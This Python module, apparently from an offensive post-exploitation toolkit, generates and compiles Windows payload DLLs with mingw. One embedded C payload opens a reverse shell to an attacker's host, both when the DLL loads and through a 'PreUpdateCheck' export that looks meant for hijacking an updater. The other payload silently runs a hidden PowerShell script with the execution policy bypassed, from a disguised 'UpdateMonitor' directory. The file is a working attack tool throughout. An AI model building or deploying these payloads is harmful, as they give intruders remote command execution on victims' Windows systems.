from __future__ import annotations

import sys
import subprocess
import tempfile
from pathlib import Path

from admapper.core.output import print_info, print_success
from admapper.core.platform import resolve_executable
from admapper.postex.pe_arch import TargetArch

_MINGW_DLL_C = r"""
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

static void revshell(void) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;
    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) return;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons({PORT});
    addr.sin_addr.s_addr = inet_addr("{LHOST}");
    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) return;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}

__declspec(dllexport) int PreUpdateCheck(void) {
    revshell();
    return 1;
}

DWORD WINAPI worker(LPVOID unused) {
    (void)unused;
    revshell();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
    (void)inst;
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(inst);
        CreateThread(NULL, 0, worker, NULL, 0, NULL);
    }
    return TRUE;
}
"""

_MINGW_ENROLL_DLL_C = r"""
#include <stdio.h>
#include <windows.h>

static void dbg(const char *msg) {
    FILE *f = fopen("C:\\ProgramData\\UpdateMonitor\\dll.log", "a");
    if (f) {
        fprintf(f, "%s\n", msg);
        fclose(f);
    }
}

static void run_enroll(void) {
    /*
     * x86 DLL on x64 Windows: use Sysnative so cmd/powershell are 64-bit and
     * can reach System32. WoW64 cmd.exe often fails to start enroll.ps1.
     */
    char cmd[768];
    snprintf(
        cmd,
        sizeof(cmd),
        "C:\\Windows\\Sysnative\\cmd.exe /c \"\"C:\\Windows\\Sysnative\\WindowsPowerShell\\v1.0\\powershell.exe\" "
        "-NoProfile -NoLogo -WindowStyle Hidden -ExecutionPolicy Bypass "
        "-Command \"& 'C:\\ProgramData\\UpdateMonitor\\enroll.ps1'\"\"");
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    dbg("PreUpdateCheck: launching enroll.ps1");
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        char err[80];
        snprintf(err, sizeof(err), "CreateProcess failed: %lu", (unsigned long)GetLastError());
        dbg(err);
        return;
    }
    WaitForSingleObject(pi.hProcess, 180000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    dbg("PreUpdateCheck: enroll.ps1 finished");
}

__declspec(dllexport) int PreUpdateCheck(void) {
    run_enroll();
    return 1;
}

BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
    (void)inst;
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(inst);
    return TRUE;
}
"""

_MINGW_GCC = {
    "x64": ["x86_64-w64-mingw32-gcc", "x86_64-w64-mingw32-gcc-15", "x86_64-w64-mingw32-gcc-14"],
    "x86": ["i686-w64-mingw32-gcc", "i686-w64-mingw32-gcc-15", "i686-w64-mingw32-gcc-14"],
}


def resolve_mingw_gcc(arch: TargetArch = "x86") -> str | None:
    for name in _MINGW_GCC[arch]:
        found = resolve_executable([name])
        if found:
            return found
    return None


def ensure_mingw_gcc(arch: TargetArch = "x86") -> str:
    found = resolve_mingw_gcc(arch)
    if found:
        return found
    if sys.platform == "darwin":
        brew = resolve_executable(["brew"])
        if brew:
            print_info("mingw-w64 not found — installing via Homebrew …")
            proc = subprocess.run(
                [brew, "install", "mingw-w64"],
                capture_output=True,
                text=True,
                check=False,
            )
            if proc.returncode == 0:
                found = resolve_mingw_gcc(arch)
                if found:
                    return found
            detail = (proc.stderr or proc.stdout or "").strip()
            raise RuntimeError(f"brew install mingw-w64 failed: {detail}")
    raise RuntimeError(
        f"no mingw gcc for {arch} — install mingw-w64 (macOS: brew install mingw-w64)"
    )


def build_reverse_shell_dll_mingw(
    *,
    lhost: str,
    lport: int,
    out_path: Path,
    arch: TargetArch = "x86",
) -> Path:
    gcc = ensure_mingw_gcc(arch)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    source = _MINGW_DLL_C.replace("{LHOST}", lhost).replace("{PORT}", str(int(lport)))
    with tempfile.TemporaryDirectory(prefix="admapper-dll-") as tmp:
        src = Path(tmp) / "payload.c"
        def_file = Path(tmp) / "payload.def"
        src.write_text(source, encoding="utf-8")
        def_file.write_text(
            f"LIBRARY {out_path.stem}\nEXPORTS\nPreUpdateCheck\n",
            encoding="utf-8",
        )
        cmd = [
            gcc,
            "-shared",
            "-o",
            str(out_path),
            str(src),
            str(def_file),
            "-lws2_32",
            "-O2",
            "-s",
            "-Wno-implicit-function-declaration",
        ]
        print_info(f"building {arch} DLL via mingw ({lhost}:{lport}) …")
        proc = subprocess.run(cmd, capture_output=True, text=True, check=False, timeout=120)
        if proc.returncode != 0 or not out_path.is_file():
            detail = (proc.stderr or proc.stdout or "").strip()
            raise RuntimeError(f"mingw DLL build failed: {detail or proc.returncode}")
    print_success(f"payload DLL → {out_path} ({out_path.stat().st_size} bytes, mingw-{arch})")
    return out_path


def build_cert_enroll_dll_mingw(
    *,
    out_path: Path,
    arch: TargetArch = "x86",
) -> Path:
    """DLL that runs enroll.ps1 from UpdateMonitor dir (deploy script separately via WinRM)."""
    gcc = ensure_mingw_gcc(arch)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    with tempfile.TemporaryDirectory(prefix="admapper-enroll-dll-") as tmp:
        source = _MINGW_ENROLL_DLL_C
        src = Path(tmp) / "enroll.c"
        def_file = Path(tmp) / "enroll.def"
        src.write_text(source, encoding="utf-8")
        def_file.write_text(
            f"LIBRARY {out_path.stem}\nEXPORTS\nPreUpdateCheck\n",
            encoding="utf-8",
        )
        cmd = [
            gcc,
            "-shared",
            "-o",
            str(out_path),
            str(src),
            str(def_file),
            "-O2",
            "-s",
        ]
        print_info(f"building {arch} cert-enroll DLL via mingw …")
        proc = subprocess.run(cmd, capture_output=True, text=True, check=False, timeout=120)
        if proc.returncode != 0 or not out_path.is_file():
            detail = (proc.stderr or proc.stdout or "").strip()
            raise RuntimeError(f"mingw enroll DLL build failed: {detail or proc.returncode}")
    print_success(f"enroll DLL → {out_path} ({out_path.stat().st_size} bytes, mingw-{arch})")
    return out_path
